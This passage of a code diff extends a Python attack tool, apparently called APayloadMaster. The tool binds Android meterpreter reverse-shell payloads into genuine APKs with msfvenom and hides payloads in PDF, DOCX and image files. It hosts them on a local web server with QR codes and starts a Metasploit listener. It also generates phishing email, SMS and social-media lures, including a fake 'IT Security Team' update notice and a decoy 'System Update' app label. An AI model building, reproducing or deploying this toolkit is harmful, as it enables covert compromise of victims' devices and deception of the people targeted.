+                    keystore_path = os.path.join(os.getcwd(), "debug.keystore")
+                    if os.path.exists(keystore_path):
+                        cmd2 = [
+                            "msfvenom", "-x", apk_path,
+                            "-p", "android/meterpreter/reverse_tcp",
+                            f"LHOST={lhost_for_msf}", f"LPORT={self.current_lport}",
+                            "--keystore", keystore_path,
+                            "--keypass", "android",
+                            "--storepass", "android",
+                            "-o", output_path
+                        ]
+                        result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=180)
+                        if result2.returncode == 0:
+                            print(f"{self.colors.GREEN}[+] Bound APK created using jarsigner: {output_path}{self.colors.ENDC}")
+                        else:
+                            print(f"{self.colors.RED}[!] jarsigner attempt also failed: {result2.stderr}{self.colors.ENDC}")
+                    else:
+                        print(f"{self.colors.RED}[!] debug.keystore not found, cannot sign. Please install apksigner or create debug.keystore.{self.colors.ENDC}")
+                elif "apktool" in result.stderr.lower():
+                    print(f"{self.colors.YELLOW}[*] This is likely an apktool version issue. Please upgrade apktool.{self.colors.ENDC}")
+                elif "zipalign not found" in result.stderr:
+                    print(f"{self.colors.RED}[!] zipalign not found. Please install Android SDK build-tools.{self.colors.ENDC}")
+                    print(f"{self.colors.YELLOW}[*] On Kali: sudo apt install android-sdk-build-tools{self.colors.ENDC}")
+                    print(f"{self.colors.YELLOW}[*] On Termux: pkg install android-tools{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
     
-    def create_download_link(self, filepath):
-        # ... (same as original)
-        pass
+    def bind_with_pdf(self):
+        pdf_path = input(f"{self.colors.YELLOW}[?] Enter path to original PDF file: {self.colors.ENDC}")
+        if not os.path.exists(pdf_path):
+            print(f"{self.colors.RED}[!] PDF file not found{self.colors.ENDC}")
+            return
+        output_name = input(f"{self.colors.YELLOW}[?] Enter output PDF name (default: bound.pdf): {self.colors.ENDC}") or "bound.pdf"
+        output_path = f"output/bound/{output_name}"
+        try:
+            with open(pdf_path, 'rb') as f_pdf:
+                pdf_data = f_pdf.read()
+            with open(self.current_payload, 'rb') as f_payload:
+                payload_data = f_payload.read()
+            with open(output_path, 'wb') as f_out:
+                f_out.write(pdf_data)
+                f_out.write(b"\n<!-- PAYLOAD START -->\n")
+                f_out.write(payload_data)
+            print(f"{self.colors.GREEN}[+] Payload appended to PDF: {output_path}{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[!] Note: This may not execute automatically. Use social engineering.{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
     
-    def hide_in_image_menu(self, filepath):
-        # ... (same as original)
-        pass
+    def bind_with_docx(self):
+        docx_path = input(f"{self.colors.YELLOW}[?] Enter path to original DOCX file: {self.colors.ENDC}")
+        if not os.path.exists(docx_path):
+            print(f"{self.colors.RED}[!] DOCX file not found{self.colors.ENDC}")
+            return
+        output_name = input(f"{self.colors.YELLOW}[?] Enter output DOCX name (default: bound.docx): {self.colors.ENDC}") or "bound.docx"
+        output_path = f"output/bound/{output_name}"
+        try:
+            import zipfile
+            with zipfile.ZipFile(docx_path, 'r') as zin:
+                with zipfile.ZipFile(output_path, 'w') as zout:
+                    for item in zin.infolist():
+                        zout.writestr(item, zin.read(item.filename))
+                    zout.write(self.current_payload, arcname=os.path.basename(self.current_payload))
+            print(f"{self.colors.GREEN}[+] Payload added to DOCX: {output_path}{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[!] User would need to extract and run the payload.{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
+    
+    def hide_in_image_menu(self):
+        print(f"\n{self.colors.CYAN}[STEGANOGRAPHY]{self.colors.ENDC}")
+        print("1. Use existing image")
+        print("2. Download random image")
+        print("3. Back")
+        choice = input(f"{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
+        if choice == "1":
+            image_path = input(f"{self.colors.YELLOW}[?] Enter image path: {self.colors.ENDC}")
+            if os.path.exists(image_path):
+                self.hide_in_image(self.current_payload, image_path)
+        elif choice == "2":
+            self.download_and_hide_image(self.current_payload)
     
     def hide_in_image(self, payload_path, image_path):
-        # ... (same as original)
-        pass
-    
-    def create_windows_shortcut(self, filepath):
-        # ... (same as original)
-        pass
-    
-    def create_android_launcher(self, filepath):
-        # ... (same as original)
-        pass
-    
-    def start_http_server(self, port=8080):
-        # ... (same as original, but fix directory change)
-        # We'll move to server/uploads only in the thread
-        pass
+        if not shutil.which("steghide"):
+            print(f"{self.colors.RED}[!] steghide not installed. Install with: sudo apt install steghide{self.colors.ENDC}")
+            return
+        output_image = f"output/bound/{os.path.basename(image_path)}_hidden.jpg"
+        try:
+            cmd = ["steghide", "embed", "-cf", image_path, "-ef", payload_path, "-sf", output_image, "-p", ""]
+            result = subprocess.run(cmd, capture_output=True, text=True, input="\n")
+            if result.returncode == 0:
+                print(f"{self.colors.GREEN}[+] Payload hidden in image: {output_image}{self.colors.ENDC}")
+            else:
+                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
     
     def download_and_hide_image(self, payload_path):
-        # ... (same as original)
-        pass
+        try:
+            import requests
+            url = "https://source.unsplash.com/random/800x600"
+            response = requests.get(url, stream=True)
+            if response.status_code == 200:
+                image_path = f"output/bound/random_{int(time.time())}.jpg"
+                with open(image_path, 'wb') as f:
+                    for chunk in response.iter_content(1024):
+                        f.write(chunk)
+                print(f"{self.colors.GREEN}[+] Image downloaded: {image_path}{self.colors.ENDC}")
+                self.hide_in_image(payload_path, image_path)
+            else:
+                print(f"{self.colors.RED}[!] Failed to download image{self.colors.ENDC}")
+        except ImportError:
+            print(f"{self.colors.RED}[!] Requests module not installed{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
     
-    # ===== DISTRIBUTION =====
-    def distribution_menu(self, filepath):
-        # ... (same as original)
-        pass
+    def generate_qr_code(self, filepath):
+        try:
+            import qrcode
+        except ImportError:
+            print(f"{self.colors.RED}[!] QRCode module not installed. Install with: pip3 install qrcode[pil]{self.colors.ENDC}")
+            return
+        self.start_http_server(8080)
+        filename = os.path.basename(filepath)
+        qr_data = f"http://{self.local_ip}:8080/{urllib.parse.quote(filename)}"
+        qr = qrcode.QRCode(version=1, box_size=10, border=5)
+        qr.add_data(qr_data)
+        qr.make(fit=True)
+        img = qr.make_image(fill='black', back_color='white')
+        qr_file = f"output/bound/{filename}_qr.png"
+        img.save(qr_file)
+        print(f"{self.colors.GREEN}[+] QR code generated: {qr_file}{self.colors.ENDC}")
+        print(f"{self.colors.CYAN}[*] Scan to download: {qr_data}{self.colors.ENDC}")
     
-    def save_locally(self, filepath, save_dir):
-        # ... (same as original)
-        pass
+    def create_windows_shortcut(self, filepath):
+        shortcut_content = f'''[InternetShortcut]
+URL=file:///{os.path.abspath(filepath).replace(os.sep, '/')}
+IconIndex=0
+'''
+        shortcut_file = f"output/bound/{os.path.basename(filepath)}.url"
+        with open(shortcut_file, 'w') as f:
+            f.write(shortcut_content)
+        print(f"{self.colors.GREEN}[+] Windows shortcut created: {shortcut_file}{self.colors.ENDC}")
+    
+    def create_android_launcher(self, filepath):
+        launcher_content = f'''<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.launcher.app">
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Update"
+        android:theme="@style/AppTheme">
+        <activity android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
+'''
+        launcher_file = f"output/bound/{os.path.basename(filepath)}_launcher.xml"
+        with open(launcher_file, 'w') as f:
+            f.write(launcher_content)
+        print(f"{self.colors.GREEN}[+] Android launcher config created: {launcher_file}{self.colors.ENDC}")
+    
+    def start_http_server(self, port=8080):
+        if self.http_server:
+            print(f"{self.colors.YELLOW}[*] HTTP server already running{self.colors.ENDC}")
+            return
+        if self.current_payload:
+            shutil.copy2(self.current_payload, "server/uploads/")
+        os.chdir("server/uploads")
+        class FileHandler(http.server.SimpleHTTPRequestHandler):
+            def log_message(self, format, *args):
+                print(f"{self.colors.CYAN}[HTTP] {args[0]} - {args[1]}{self.colors.ENDC}")
+        def run_server():
+            with socketserver.TCPServer(("", int(port)), FileHandler) as httpd:
+                self.http_server = httpd
+                print(f"{self.colors.GREEN}[+] HTTP server started on port {port}{self.colors.ENDC}")
+                print(f"{self.colors.CYAN}[*] Serving files from: {os.getcwd()}{self.colors.ENDC}")
+                httpd.serve_forever()
+        thread = threading.Thread(target=run_server)
+        thread.daemon = True
+        thread.start()
+        os.chdir("../..")
     
     def generate_email_template(self, filepath):
-        # ... (same as original)
-        pass
-    
-    def generate_social_media_message(self, filepath):
-        # ... (same as original)
-        pass
+        filename = os.path.basename(filepath)
+        download_url = f"http://{self.local_ip}:8080/{filename}"
+        template = f"""
+=== EMAIL TEMPLATE ===
+Subject: Important Document / Invoice / Update
+
+Body:
+Dear User,
+
+Please find attached the important document you requested.
+You can also download it from: {download_url}
+
+Best regards,
+[Your Name]
+
+=== OR ===
+
+Subject: Security Update Required
+
+Body:
+Your account requires immediate security update.
+Download and run the attached file to apply the patch.
+
+Download link: {download_url}
+
+Thank you,
+IT Security Team
+"""
+        template_file = f"output/distribution/email_template_{filename}.txt"
+        os.makedirs("output/distribution", exist_ok=True)
+        with open(template_file, 'w') as f:
+            f.write(template)
+        print(f"{self.colors.GREEN}[+] Email template saved: {template_file}{self.colors.ENDC}")
     
     def generate_sms_template(self, filepath):
-        # ... (same as original)
-        pass
+        filename = os.path.basename(filepath)
+        download_url = f"http://{self.local_ip}:8080/{filename}"
+        template = f"""
+=== SMS TEMPLATE ===
+
+Option 1:
+Hi! Here's the file you requested: {download_url}
+
+Option 2:
+Urgent: Security update required. Download: {download_url}
+
+Option 3:
+Your document is ready: {download_url}
+"""
+        template_file = f"output/distribution/sms_template_{filename}.txt"
+        os.makedirs("output/distribution", exist_ok=True)
+        with open(template_file, 'w') as f:
+            f.write(template)
+        print(f"{self.colors.GREEN}[+] SMS template saved: {template_file}{self.colors.ENDC}")
+    
+    def generate_social_media_message(self, filepath):
+        filename = os.path.basename(filepath)
+        download_url = f"http://{self.local_ip}:8080/{filename}"
+        template = f"""
+=== SOCIAL MEDIA TEMPLATE ===
+
+Twitter:
+Check out this cool app I found! It's super useful. Download here: {download_url}
+
+Facebook:
+Hey friends! I just found this amazing tool that you all should try.
+Get it from: {download_url}
+
+Instagram (Bio):
+Latest tool download: {download_url}
+
+Discord/Telegram:
+New tool release! Download from: {download_url}
+"""
+        template_file = f"output/distribution/social_media_{filename}.txt"
+        os.makedirs("output/distribution", exist_ok=True)
+        with open(template_file, 'w') as f:
+            f.write(template)
+        print(f"{self.colors.GREEN}[+] Social media template saved: {template_file}{self.colors.ENDC}")
+    
+    def create_download_link(self, filepath):
+        port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
+        filename = os.path.basename(filepath)
+        server_path = f"server/uploads/{filename}"
+        shutil.copy2(filepath, server_path)
+        download_url = f"http://{self.local_ip}:{port}/{filename}"
+        print(f"{self.colors.GREEN}[+] Download link: {download_url}{self.colors.ENDC}")
+        self.start_http_server(port)
+    
+    def decrypt_apk_menu(self):
+        print(f"\n{self.colors.CYAN}[DECRYPT ENCRYPTED APK]{self.colors.ENDC}")
+        print("="*50)
+        encrypted_file = input(f"{self.colors.YELLOW}[?] Enter path to encrypted APK (.enc file): {self.colors.ENDC}")
+        key_file = input(f"{self.colors.YELLOW}[?] Enter path to key file (.key file): {self.colors.ENDC}")
+        if not os.path.exists(encrypted_file) or not os.path.exists(key_file):
+            print(f"{self.colors.RED}[!] Files not found{self.colors.ENDC}")
+            return
+        try:
+            with open(encrypted_file, 'rb') as f:
+                encrypted_data = f.read()
+            with open(key_file, 'rb') as f:
+                key = f.read()
+            from Crypto.Cipher import AES
+            nonce = encrypted_data[:16]
+            tag = encrypted_data[16:32]
+            ciphertext = encrypted_data[32:]
+            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
+            decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
+            decrypted_file = encrypted_file.replace('.enc', '_decrypted.apk')
+            with open(decrypted_file, 'wb') as f:
+                f.write(decrypted_data)
+            print(f"{self.colors.GREEN}[+] APK decrypted: {decrypted_file}{self.colors.ENDC}")
+        except ImportError:
+            print(f"{self.colors.RED}[!] PyCryptodome not installed{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Decryption error: {e}{self.colors.ENDC}")
     
     # ===== MAIN MENU =====
+    
     def main_menu(self):
         while True:
             print(f"\n{self.colors.PURPLE}╔═════════════════════════════════════════════════════════════════╗")
@@ -860,7 +1346,10 @@ exploit -j
             if choice == "1":
                 self.create_payload_menu()
             elif choice == "2":
-                self.binding_menu()
+                if self.current_payload:
+                    self.binding_menu()
+                else:
+                    print(f"{self.colors.RED}[!] No payload generated yet. Create one first.{self.colors.ENDC}")
             elif choice == "3":
                 if self.current_payload:
                     self.distribution_menu(self.current_payload)
@@ -870,7 +1359,7 @@ exploit -j
                         self.distribution_menu(filepath)
             elif choice == "4":
                 if self.current_lhost and self.current_lport and self.current_payload_type:
-                    self.start_metasploit_listener()
+                    self.ask_start_listener()
                 else:
                     print(f"{self.colors.RED}[!] No payload settings found. Generate a payload first or enter manually.{self.colors.ENDC}")
                     lhost = input(f"{self.colors.YELLOW}[?] Enter LHOST: {self.colors.ENDC}")
@@ -882,7 +1371,7 @@ exploit -j
                     self.current_lhost = lhost
                     self.current_lport = lport
                     self.current_payload_type = type_map.get(ptype, "windows")
-                    self.start_metasploit_listener()
+                    self.ask_start_listener()
             elif choice == "5":
                 port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
                 self.start_http_server(port)
@@ -900,6 +1389,11 @@ exploit -j
                     self.http_server.shutdown()
                 print(f"{self.colors.GREEN}[+] Cleanup complete. Goodbye!{self.colors.ENDC}")
                 sys.exit(0)
+    
+    def distribution_menu(self, filepath):
+        self.generate_email_template(filepath)
+        self.generate_sms_template(filepath)
+        self.generate_social_media_message(filepath)
 
 def main():
     tool = APayloadMaster()
